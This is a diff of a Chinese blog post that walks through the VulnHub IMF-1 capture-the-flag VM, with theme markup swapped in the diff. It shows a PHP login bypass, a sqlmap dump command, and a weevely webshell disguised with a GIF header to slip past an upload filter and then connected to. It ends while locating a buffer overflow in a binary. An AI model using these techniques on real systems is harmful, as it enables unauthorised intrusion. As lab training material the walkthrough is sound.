@@ -1,24 +1,26 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="keywords" content="Hexo Theme Redefine">
-    
-    <meta name="author" content="Hertz">
-    <!-- preconnect -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<html lang='zh-CN'>
 
-    
-    <!--- Seo Part-->
-    
-    <link rel="canonical" href="https://tmp.com/2024/01/16/vulnhub-imf-1简单记录/"/>
-    <meta name="robots" content="index,follow">
-    <meta name="googlebot" content="index,follow">
-    <meta name="revisit-after" content="1 days">
-    
-        <meta name="description" content="描述Welcome to “IMF”, my first Boot2Root virtual machine. IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. E">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.23.0" theme-name="Stellar" theme-version="1.23.0">
+  
+  <meta name="generator" content="Hexo 7.0.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>VulnHub IMF-1 简单记录 - Hertz's Box</title>
+
+  
+    <meta name="description" content="描述Welcome to “IMF”, my first Boot2Root virtual machine. IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. E">
 <meta property="og:type" content="article">
 <meta property="og:title" content="VulnHub IMF-1 简单记录">
 <meta property="og:url" content="https://tmp.com/2024/01/16/Vulnhub-IMF-1%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/index.html">
@@ -40,434 +42,77 @@
 <meta property="article:tag" content="缓冲区溢出">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131572.png">
+  
+  
+  
+  <meta name="keywords" content="vulnhub,缓冲区溢出">
+
+  <!-- feed -->
+  
+
+  
     
-    
-    <!--- Icon Part-->
-    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
-    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
-    <meta name="theme-color" content="#A31F34">
-    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
-    <!--- Page Info-->
-    
-    <title>
-        
-            VulnHub IMF-1 简单记录 -
-        
-        Hertz&#39;s Box
-    </title>
+<link rel="stylesheet" href="/css/main.css">
 
-    
-<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+  
 
+  
 
-    
-        <style>
-    :root {
-        --preloader-background-color: #fff;
-        --preloader-text-color: #000;
-    }
+  
 
-    @media (prefers-color-scheme: dark) {
-        :root {
-            --preloader-background-color: #202124;
-            --preloader-text-color: #fff;
-        }
-    }
-
-    @media (prefers-color-scheme: light) {
-        :root {
-            --preloader-background-color: #fff;
-            --preloader-text-color: #000;
-        }
-    }
-
-    @media (max-width: 600px) {
-        .ml13 {
-            font-size: 2.6rem !important; /* Adjust this value as needed */
-        }
-    }
-
-    .preloader {
-        display: flex;
-        flex-direction: column;
-        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
-        align-items: center;
-        justify-content: center;
-        position: fixed;
-        padding: 12px;
-        top: 0;
-        right: 0;
-        bottom: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh; /* 'h-screen' is 100% of the viewport height */
-        background-color: var(--preloader-background-color);
-        z-index: 1100; /* 'z-[1100]' sets the z-index */
-        transition: opacity 0.2s ease-in-out;
-    }
-
-    .ml13 {
-        font-size: 3.2rem;
-        /* text-transform: uppercase; */
-        color: var(--preloader-text-color);
-        letter-spacing: -1px;
-        font-weight: 500;
-        font-family: 'Chillax-Variable', sans-serif;
-        text-align: center;
-    }
-
-    .ml13 .word {
-        display: inline-flex;
-        flex-wrap: wrap;
-        white-space: nowrap;
-    }
-
-    .ml13 .letter {
-        display: inline-block;
-        line-height: 1em;
-    }
-</style>
-
-<div class="preloader">
-    
-<script src="/js/libs/anime.min.js"></script>
-
-    <h1 class="ml13">
-        Hertz&#39;s Box
-    </h1>
-    <script>
-        var textWrapper = document.querySelector('.ml13');
-        // Split text into words
-        var words = textWrapper.textContent.trim().split(' ');
-
-        // Clear the existing content
-        textWrapper.innerHTML = '';
-
-        // Wrap each word and its letters in spans
-        words.forEach(function(word) {
-            var wordSpan = document.createElement('span');
-            wordSpan.classList.add('word');
-            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
-            textWrapper.appendChild(wordSpan);
-            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
-        });
-
-
-        anime.timeline({loop: true})
-            .add({
-                targets: '.ml13 .letter',
-                translateY: [100,0],
-                translateZ: 0,
-                opacity: [0,1],
-                easing: "easeOutExpo",
-                duration: 1400,
-                delay: (el, i) => 300 + 30 * i
-            }).add({
-            targets: '.ml13 .letter',
-            translateY: [0,-100],
-            opacity: [1,0],
-            easing: "easeInExpo",
-            duration: 1200,
-            delay: (el, i) => 100 + 30 * i
-        });
-
-        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
-
-        // If the theme status is not found in local storage, check the preferred color scheme
-        if (themeStatus === undefined || themeStatus === null) {
-            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
-                themeStatus = 'dark';
-            } else {
-                themeStatus = 'light';
-            }
-        }
-
-        // Now you can use the themeStatus variable in your code
-        if (themeStatus) {
-            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
-            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
-        } else {
-            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
-            document.documentElement.style.setProperty('--preloader-text-color', '#000');
-        }
-
-        window.addEventListener('load', function () {
-            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
-        });
-
-        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
-        hidePreloaderAfterTimeout(5000);
-
-        function hidePreloaderAfterTimeout(delay) {
-            setTimeout(function () {
-                var preloader = document.querySelector('.preloader');
-                preloader.style.opacity = '0';
-                setTimeout(function () {
-                    preloader.style.display = 'none';
-                }, 200);
-            }, delay);
-        }
-    </script>
-</div>
-    
-
-    
-<link rel="stylesheet" href="/css/style.css">
-
-
-    
-        
-<link rel="stylesheet" href="/assets/build/styles.css">
-
-    
-
-    
-<link rel="stylesheet" href="/fonts/fonts.css">
-
-    
-<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
-
-    <!--- Font Part-->
-    
-    
-    
-    
-
-    <!--- Inject Part-->
-    
-    <script id="hexo-configurations">
-    window.config = {"hostname":"tmp.com","root":"/","language":"zh-CN"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
-    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
-    window.data = {"masonry":false};
-  </script>
-    
-    <!--- Fontawesome Part-->
-    
-<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
-
-    
-<link rel="stylesheet" href="/fontawesome/brands.min.css">
-
-    
-<link rel="stylesheet" href="/fontawesome/solid.min.css">
-
-    
-<link rel="stylesheet" href="/fontawesome/regular.min.css">
-
-    
-    
-    
-    
-<meta name="generator" content="Hexo 7.0.0"></head>
-
+  
+  
+</head>
 
 <body>
-<div class="progress-bar-container">
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
     
 
-    
-        <span class="pjax-progress-bar"></span>
-<!--        <span class="swup-progress-icon">-->
-<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
-<!--        </span>-->
-    
-</div>
+  
 
+<header class="header"><div class="logo-wrap"><a class="title" href="/"><div class="main" ff="title">Hertz's Box</div><div class="sub normal cap">进行时</div><div class="sub hover cap" style="opacity:0"> 摆烂中</div></a></div>
 
-<main class="page-container" id="swup">
-
-    
-
-    <div class="main-content-container">
-
-
-        <div class="main-content-header">
-            <header class="navbar-container">
-
-    <div class="navbar-content">
-        <div class="left">
-            
-            <a class="logo-title" href="/">
-                
-                Hertz&#39;s Box
-                
-            </a>
-        </div>
-
-        <div class="right">
-            <!-- PC -->
-            <div class="desktop">
-                <ul class="navbar-list">
-                    
-                        
-                            
-
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class=""
-                                   href="/"
-                                        >
-                                    <i class="fa-regular fa-house fa-fw"></i>
-                                    首页
-                                    
-                                </a>
-
-                                <!-- Submenu -->
-                                
-                            </li>
-                    
-                    
-                </ul>
-            </div>
-            <!-- Mobile -->
-            <div class="mobile">
-                
-                <div class="icon-item navbar-bar">
-                    <div class="navbar-bar-middle"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Mobile drawer -->
-    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
-        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
-            
-                
-                    
-
-                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
-                        
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
-                           href="/"
-                        >
-                            <span>
-                                首页
-                            </span>
-                            
-                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
-                            
-                        </a>
-                        
-
-                        
-                    </li>
-            
-        </ul>
-
-        <div class="statistics flex justify-around my-2.5">
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
-        <div class="label text-third-text-color text-sm">标签</div>
-    </a>
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
-        <div class="label text-third-text-color text-sm">分类</div>
-    </a>
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
-        <div class="label text-third-text-color text-sm">文章</div>
-    </a>
-</div>
-    </div>
-
-    <div class="window-mask"></div>
-
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a></nav>
 </header>
 
 
-        </div>
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
 
-        <div class="main-content-body">
 
-            
+<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header cap dis-select"><span class="name">VulnHub IMF-1 简单记录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-text">描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%A2%98%E8%A7%A3"><span class="toc-text">参考题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95"><span class="toc-text">过程记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></div></div></widget>
 
-            <div class="main-content">
 
-                
-                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
-    <div class="article-content-container">
 
-        <div class="article-title relative w-full">
-            
-                <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">VulnHub IMF-1 简单记录</h1>
-                </div>
-            
-            </div>
 
-        
-            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/images/redefine-avatar.svg">
-                </div>
-                <div class="info flex flex-col justify-between">
-                    <div class="author flex items-center">
-                        <span class="name text-default-text-color text-lg font-semibold">Hertz</span>
-                        
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-01-16 11:45:13</span>
-        <span class="mobile">2024-01-16 11:45:13</span>
-        <span class="hover-info">创建</span>
-    </span>
-    
-        <span class="article-date article-meta-item">
-            <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-01-16 16:19:24</span>
-            <span class="mobile">2024-01-16 16:19:24</span>
-            <span class="hover-info">更新</span>
-        </span>
-    
-
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fa-regular fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/vulnhub/">vulnhub</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">缓冲区溢出</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-
-    
-    
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
 </div>
 
-                    </div>
-                </div>
-            </div>
-        
 
-        
+    </aside>
+    <div class='l_main'>
+      
 
+      
 
-        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>Welcome to “IMF”, my first Boot2Root virtual machine. IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag. I hope you enjoy this VM and learn something.</p>
+<div class="bread-nav fs12"><div class="left"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div><div id="post-meta"><span class="author">发布于</span>
+    <span class="created"><time datetime="2024-01-16T03:45:13.000Z">2024-01-16</time></span>
+    
+    <span class="updated">，更新于&nbsp;<time datetime="2024-01-16T08:19:24.843Z">2024-01-16</time></span>
+    </div></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>VulnHub IMF-1 简单记录</span></h1>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>Welcome to “IMF”, my first Boot2Root virtual machine. IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag. I hope you enjoy this VM and learn something.</p>
 <p>Difficulty: Beginner&#x2F;Moderate</p>
 <p>Can contact me at: geckom at redteamr dot com or on Twitter: @g3ck0m</p>
-<h2 id="参考题解"><a href="#参考题解" class="headerlink" title="参考题解"></a>参考题解</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/329028.html" >vulnhub靶机：IMF缓冲区提权渗透 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://secnigma.wordpress.com/2021/04/19/oscp-like-vulnhub-machines-imf-1/" >OSCP like Vulnhub 机器： IMF： 1 – SecNigma — OSCP like Vulnhub machines: IMF: 1 – SecNigma (wordpress.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="参考题解"><a href="#参考题解" class="headerlink" title="参考题解"></a>参考题解</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/329028.html">vulnhub靶机：IMF缓冲区提权渗透 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://secnigma.wordpress.com/2021/04/19/oscp-like-vulnhub-machines-imf-1/">OSCP like Vulnhub 机器： IMF： 1 – SecNigma — OSCP like Vulnhub machines: IMF: 1 – SecNigma (wordpress.com)</a></p>
 <h2 id="过程记录"><a href="#过程记录" class="headerlink" title="过程记录"></a>过程记录</h2><blockquote>
 <p>VMware安装靶机时网络设配器默认为桥接，改为NAT模式</p>
 </blockquote>
@@ -477,458 +122,254 @@
 <p>依据网上WP的提示，在contact.php源码中发现 <code> &lt;!-- flag1&#123;YWxsdGhlZmlsZXM=&#125; --&gt;</code></p>
 <p>猜测为Base64编码，解码结果为<code>allthefiles</code></p>
 </blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131572.png"
-                      alt="image-20240115115755652"
-                ></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131572.png" alt="image-20240115115755652"></p>
 <p>最后3个文件名有点奇怪；最后拼凑为<code>ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ=</code>解码为<code>flag2&#123;aW1mYWRtaW5pc3RyYXRvcg==&#125;</code>，进一步解码为<code>imfadministrator</code>，有一点像登录名？</p>
 <blockquote>
 <p>依据题解直接访问 <code>IP/imfadministrator</code>；阅读源码发现提示  <code>&lt; I couldn&#39;t get the SQL working, so I hard-coded the password. It&#39;s still mad secure through. - Roger&gt;</code></p>
-<p>通过提示得知了利用PHP 数组’[]’绕过，登录成功 <code>flag3&#123;Y29udGludWVUT2Ntcw==&#125;</code>，解码为<code>continueTOcms</code><br> <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46150940/article/details/105746392" >代码审计之弱类型绕过_$_get[‘a’];-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>通过提示得知了利用PHP 数组’[]’绕过，登录成功 <code>flag3&#123;Y29udGludWVUT2Ntcw==&#125;</code>，解码为<code>continueTOcms</code><br> <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46150940/article/details/105746392">代码审计之弱类型绕过_$_get[‘a’];-CSDN博客</a></p>
 </blockquote>
 <p>在上一步中继续访问页面，观察页面，猜测存在sql注入点：<code>http://192.168.5.136/imfadministrator/cms.php?pagename=home</code>，利用sqlmap进行爆破<code>sqlmap -u &quot;http://192.168.5.136/imfadministrator/cms.php?pagename=&quot; --dump --batch --cookie &#39;PHPSESSID=h40f1jak6md9rq4ot2r9rco8s0&#39; --risk=3 --level=5  </code></p>
 <blockquote>
 <p>在自己尝试时并没有使用 <code>--risk &amp;&amp; --level</code>参数，这个有和没有的不一样在哪里呢？<br>level 是指探测等级，默认为1，主要影响payload的使用以及测试的注入点范围，如果不确定注入点时可以使用高的level值；<br>risk时风险等级，值越高，对表造成的破坏的可能性就越大； 默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>
 </blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131647.png"
-                      alt="image-20240115140347862"
-                ></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131647.png" alt="image-20240115140347862"></p>
 <p>查看pages.csv，获得网址<code>http://192.168.5.136/imfadministrator/cms.php?pagename=tutorials-incomplete</code>，扫描图中二维码获得<code>flag4&#123;dXBsb2Fkcjk0Mi5waHA=&#125;</code>，解码为<code>uploadr942.php</code>；</p>
 <p>编写<code>1.php</code>含一句话木马进行上传，提示<code>Error: Invalid file type.</code>，然后利用burpsuit该文件名后缀为txt，随后尝试jpg，png均失败，猜测不仅使用后缀名进行判断；</p>
 <blockquote>
 <p>WP: 则猜测使用文件格式进行判断；利用weevely生成php木马；<code>weevely generate test my.php  </code>，并在文件开头加上git文件头<code>GIF89</code>，上传成功，并在上传后的<strong>网页源码</strong>中发现上传后的文件名<code>bae80502d4c8</code>，经测试后获得上传后的路径为<code>/imfadministrator/uploads</code>，使用<code>weevely</code>进行连接后，发现flag5：<code>flag5&#123;YWdlbnRzZXJ2aWNlcw==&#125;</code>,解码为<code>agentservices</code>; 利用命令<code>weevely http://192.168.5.136/imfadministrator/uploads/bae80502d4c8.gif test </code>连接命令行；</p>
 <p>通过连接后的命令行搜索<code>agent</code>，前往</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@imf:/var/www/html $ cd /usr/local/bin/</span><br><span class="line">www-data@imf:/usr/local/bin $ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x  2 root root  4096 Oct 16  2016 .</span><br><span class="line">drwxr-xr-x 10 root root  4096 Sep 22  2016 ..</span><br><span class="line">-rw-r--r--  1 root root    19 Oct 16  2016 access_codes</span><br><span class="line">-rwxr-xr-x  1 root root 11896 Oct 12  2016 agent</span><br><span class="line">www-data@imf:/usr/local/bin $ ./agent</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@imf:/var/www/html $ cd /usr/local/bin/</span><br><span class="line">www-data@imf:/usr/local/bin $ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x  2 root root  4096 Oct 16  2016 .</span><br><span class="line">drwxr-xr-x 10 root root  4096 Sep 22  2016 ..</span><br><span class="line">-rw-r--r--  1 root root    19 Oct 16  2016 access_codes</span><br><span class="line">-rwxr-xr-x  1 root root 11896 Oct 12  2016 agent</span><br><span class="line">www-data@imf:/usr/local/bin $ ./agent</span><br></pre></td></tr></table></figure>
 
 <p>运行agent服务；</p>
 <p>端口试探：查看access_code文件：SYN 7482,8279,9467；</p>
 <p>端口碰撞是一种<strong>通过在一组预先指定的关闭端口上产生连接请求，从外部打开防火墙上的端口的方法</strong>。一旦收到正确的连接请求序列，防火墙规则就会被动态修改，以允许发送连接请求的主机通过<strong>特定端口</strong>进行连接；下载agent到本地进行分析</p>
 </blockquote>
 <p>使用IDA进行查看：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131688.png"
-                      alt="image-20240115155434875"
-                ></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131688.png" alt="image-20240115155434875"></p>
 <p>先判断s2与输入，</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161133085.png"
-                      alt="image-20240115155509809"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161133087.png"
-                      alt="image-20240115155418874"
-                ></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161133085.png" alt="image-20240115155509809"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161133087.png" alt="image-20240115155418874"></p>
 <p>发现在report函数中存在不安全函数gets；利用cyclic进行定位，偏移为168；</p>
-<p>且通过IDA反编译可知：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131719.png"
-                      alt="image-20240115165447884"
-                ></p>
